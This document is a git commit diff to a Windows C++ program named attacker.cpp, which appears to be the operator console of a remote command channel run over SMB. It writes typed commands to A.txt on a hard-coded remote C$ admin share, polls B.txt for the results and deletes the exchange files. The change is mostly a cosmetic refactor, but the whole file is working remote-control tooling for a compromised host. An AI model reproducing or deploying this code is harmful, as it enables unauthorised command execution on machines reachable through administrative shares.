dd1304250edfc2b426f24d7500de1a9ab22e0d52
Nativ2005 <118510257+Nativ2005@users.noreply.github.com>
2025-08-31 13:43:00 +0300

    Update attacker.cpp

--- attacker.cpp
+++ attacker.cpp
@@ -4,7 +4,7 @@ int main() {
     HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
     HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
 
-    char inputBuffer[1024];
+    CHAR inputBuffer[2048];
     DWORD charsRead, charsWritten;
     CHAR basePath[] = "\\\\192.168.24.247\\c$\\Users\\NativT\\Documents\\";
     CHAR fullPathA[MAX_PATH];
@@ -15,30 +15,21 @@ int main() {
         WriteConsoleA(hOut, "computer name: ", 17, &charsWritten, NULL);
 
         if (ReadFile(hIn, inputBuffer, sizeof(inputBuffer) - 1, &charsRead, NULL)) {
-            if (charsRead >= 2) {
-                inputBuffer[charsRead - 2] = '\0';
-            }
-            else {
-                inputBuffer[charsRead] = '\0';
-            }
+            if (charsRead >= 2) inputBuffer[charsRead - 2] = '\0';
+            else inputBuffer[charsRead] = '\0';
         }
-
         else {
             WriteConsoleA(hOut, "Failed to read input.\n", 22, &charsWritten, NULL);
             return 1;
         }
 
-        if (lstrcmpiA(inputBuffer, "exit") == 0) {
-            break;
-        }
+        if (lstrcmpiA(inputBuffer, "exit") == 0) break;
 
-        lstrcpyA(fullPathA, basePath);
-        lstrcatA(fullPathA, inputBuffer);
+        lstrcpyA(fullPathA, basePath); 
         lstrcatA(fullPathA, "A.txt");
-        lstrcpyA(fullPathB, basePath);
-        lstrcatA(fullPathB, inputBuffer);
+        lstrcpyA(fullPathB, basePath); 
         lstrcatA(fullPathB, "B.txt");
-        lstrcpyA(fullPathC, basePath);
+        lstrcpyA(fullPathC, basePath); 
         lstrcatA(fullPathC, "C.txt");
 
         LPCSTR UncPathA = fullPathA;
@@ -54,7 +45,6 @@ int main() {
             FILE_ATTRIBUTE_NORMAL,
             NULL
         );
-
         if (hFile == INVALID_HANDLE_VALUE) {
             WriteConsoleA(hOut, "Failed to open file.\n", 20, &charsWritten, NULL);
             return 1;
@@ -71,14 +61,10 @@ int main() {
             WriteConsoleA(hOut, ">: ", 3, &charsWritten, NULL);
 
             if (ReadFile(hIn, inputBuffer, sizeof(inputBuffer) - 1, &charsRead, NULL)) {
-                if (charsRead >= 2) {
-                    inputBuffer[charsRead - 2] = '\0';
-                }
-                else {
-                    inputBuffer[charsRead] = '\0';
-                }
+                if (charsRead >= 2) inputBuffer[charsRead - 2] = '\0';
+                else inputBuffer[charsRead] = '\0';
 
-                HANDLE hFile = CreateFileA(
+                HANDLE hFileA = CreateFileA(
                     UncPathA,
                     GENERIC_WRITE,
                     FILE_SHARE_READ,
@@ -88,18 +74,17 @@ int main() {
                     NULL
                 );
 
-                if (hFile == INVALID_HANDLE_VALUE) {
+                if (hFileA == INVALID_HANDLE_VALUE) {
                     WriteConsoleA(hOut, "Failed to open file.\n", 20, &charsWritten, NULL);
                     return 1;
                 }
 
-                if (!WriteFile(hFile, inputBuffer, (DWORD)strlen(inputBuffer), &charsWritten, NULL)) {
+                if (!WriteFile(hFileA, inputBuffer, (DWORD)strlen(inputBuffer), &charsWritten, NULL)) {
                     WriteConsoleA(hOut, "Failed to write to file.\n", 25, &charsWritten, NULL);
-                    CloseHandle(hFile);
+                    CloseHandle(hFileA);
                     return 1;
                 }
-
-                CloseHandle(hFile);
+                CloseHandle(hFileA);
 
                 if (_stricmp(inputBuffer, "exit") == 0) {
                     while (!DeleteFileA(UncPathC)) {
@@ -109,7 +94,7 @@ int main() {
                 }
 
                 while (1) {
-                    HANDLE hFile2 = CreateFileA(
+                    HANDLE hFileB = CreateFileA(
                         UncPathB,
                         GENERIC_READ,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
@@ -119,30 +104,26 @@ int main() {
                         NULL
                     );
 
-                    if (hFile2 != INVALID_HANDLE_VALUE) {
-                        DWORD bytesRead;
-                        char buffer[2048];
+                    if (hFileB != INVALID_HANDLE_VALUE) {
+                        DWORD bytesReadB;
+                        char bufferB[2048];
 
-                        while (ReadFile(hFile2, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-                            buffer[bytesRead] = '\0';
-                            WriteConsoleA(hOut, buffer, bytesRead, &charsWritten, NULL);
+                        while (ReadFile(hFileB, bufferB, sizeof(bufferB) - 1, &bytesReadB, NULL) && bytesReadB > 0) {
+                            bufferB[bytesReadB] = '\0';
+                            WriteConsoleA(hOut, bufferB, bytesReadB, &charsWritten, NULL);
                         }
                         WriteConsoleA(hOut, "\r\n", 2, &charsWritten, NULL);
-                        CloseHandle(hFile2);
+                        CloseHandle(hFileB);
 
                         int cnt = 0;
                         while (!DeleteFileA(UncPathB)) {
                             WriteConsoleA(hOut, "Failed to delete b.txt\n", 23, &charsWritten, NULL);
-
-                            cnt += 1;
-                            if (cnt == 5) {
-                                return 1;
-                            }
+                            cnt++;
+                            if (cnt == 5) return 1;
                             Sleep(1000);
                         }
                         break;
                     }
-
                     Sleep(500);
                 }
             }
@@ -152,6 +133,5 @@ int main() {
             }
         }
     }
-
     return 0;
 }
